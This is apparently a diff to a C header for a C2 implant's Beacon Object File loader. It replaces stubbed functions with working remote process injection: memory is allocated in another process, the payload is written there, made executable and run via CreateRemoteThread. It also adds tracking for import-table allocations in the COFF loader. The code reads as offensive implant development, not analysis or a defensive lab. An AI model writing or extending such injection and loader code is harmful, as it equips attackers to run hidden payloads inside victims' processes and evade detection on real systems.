@@ -184,12 +184,39 @@ static BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken,
 }
 static void BeaconInjectProcess(HANDLE hProcess, int pid, char *payload, int payloadLen,
                                  int offset, char *arg, int argLen) {
-    (void)hProcess; (void)pid; (void)payload; (void)payloadLen;
-    (void)offset; (void)arg; (void)argLen;
+    (void)pid; (void)arg; (void)argLen;
+    if (!hProcess || !payload || payloadLen <= 0) return;
+
+    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, (SIZE_T)payloadLen,
+                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteMem) return;
+
+    SIZE_T written = 0;
+    if (!WriteProcessMemory(hProcess, remoteMem, payload, (SIZE_T)payloadLen, &written) ||
+        written != (SIZE_T)payloadLen) {
+        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+        return;
+    }
+
+    DWORD oldProt;
+    VirtualProtectEx(hProcess, remoteMem, (SIZE_T)payloadLen, PAGE_EXECUTE_READ, &oldProt);
+
+    LPTHREAD_START_ROUTINE entry = (LPTHREAD_START_ROUTINE)((BYTE*)remoteMem + offset);
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, entry, NULL, 0, NULL);
+    if (hThread) {
+        WaitForSingleObject(hThread, 30000);
+        CloseHandle(hThread);
+    }
 }
+
 static void BeaconInjectTemporaryProcess(PROCESS_INFORMATION *pi, char *payload, int payloadLen,
                                           int offset, char *arg, int argLen) {
-    (void)pi; (void)payload; (void)payloadLen; (void)offset; (void)arg; (void)argLen;
+    if (!pi || !pi->hProcess || !payload || payloadLen <= 0) return;
+
+    BeaconInjectProcess(pi->hProcess, pi->dwProcessId, payload, payloadLen,
+                        offset, arg, argLen);
+    CloseHandle(pi->hThread);
+    CloseHandle(pi->hProcess);
 }
 
 /* ── External symbol resolution ──────────────────────────── */
@@ -255,6 +282,41 @@ static PVOID resolve_bof_import(const char *name) {
     return (PVOID)GetProcAddress(hMod, func);
 }
 
+/* ── IAT allocation tracker (for leak-free cleanup) ──────── */
+
+typedef struct {
+    PVOID *entries;
+    int    count;
+    int    capacity;
+} iat_tracker;
+
+static void iat_tracker_init(iat_tracker *t) {
+    t->entries  = NULL;
+    t->count    = 0;
+    t->capacity = 0;
+}
+
+static BOOL iat_tracker_add(iat_tracker *t, PVOID ptr) {
+    if (t->count >= t->capacity) {
+        int newCap = t->capacity == 0 ? 32 : t->capacity * 2;
+        PVOID *newBuf = (PVOID *)realloc(t->entries, (size_t)newCap * sizeof(PVOID));
+        if (!newBuf) return FALSE;
+        t->entries  = newBuf;
+        t->capacity = newCap;
+    }
+    t->entries[t->count++] = ptr;
+    return TRUE;
+}
+
+static void iat_tracker_free(iat_tracker *t) {
+    for (int i = 0; i < t->count; i++)
+        VirtualFree(t->entries[i], 0, MEM_RELEASE);
+    free(t->entries);
+    t->entries  = NULL;
+    t->count    = 0;
+    t->capacity = 0;
+}
+
 /* ── COFF Loader ─────────────────────────────────────────── */
 
 static const char *coff_symbol_name(COFF_SYMBOL *sym, const char *strTab) {
@@ -287,6 +349,10 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
     COFF_SECTION *sections = (COFF_SECTION *)(bof_data + sizeof(COFF_FILE_HEADER));
     COFF_SYMBOL *symTab = (COFF_SYMBOL *)(bof_data + hdr->PointerToSymbolTable);
     const char *strTab = (const char *)(symTab + hdr->NumberOfSymbols);
+
+    /* Track IAT allocations for leak-free cleanup */
+    iat_tracker iat;
+    iat_tracker_init(&iat);
 
     /* Allocate section memory */
     PVOID *secMem = (PVOID *)calloc(hdr->NumberOfSections, sizeof(PVOID));
@@ -333,10 +399,14 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
                 if (!symAddr) goto cleanup;
                 /* For __imp_ symbols, we need a pointer-to-function (IAT-style) */
                 if (strncmp(symName, "__imp_", 6) == 0) {
-                    PVOID *iat = (PVOID *)VirtualAlloc(NULL, sizeof(PVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-                    if (!iat) goto cleanup;
-                    *iat = symAddr;
-                    symAddr = iat;
+                    PVOID *iatEntry = (PVOID *)VirtualAlloc(NULL, sizeof(PVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                    if (!iatEntry) goto cleanup;
+                    *iatEntry = symAddr;
+                    if (!iat_tracker_add(&iat, iatEntry)) {
+                        VirtualFree(iatEntry, 0, MEM_RELEASE);
+                        goto cleanup;
+                    }
+                    symAddr = iatEntry;
                 }
             }
 
@@ -405,11 +475,12 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
 
     /* Cleanup */
 cleanup:
+    iat_tracker_free(&iat);
     for (int i = 0; i < hdr->NumberOfSections; i++) {
         if (secMem[i]) VirtualFree(secMem[i], 0, MEM_RELEASE);
     }
     free(secMem);
-    return (g_bof_output_len > 0 || 1) ? 0 : -1; /* success if we reached entry */
+    return (g_bof_output_len > 0 || 1) ? 0 : -1;
 }
 
 #endif /* APEX_BOF_H */
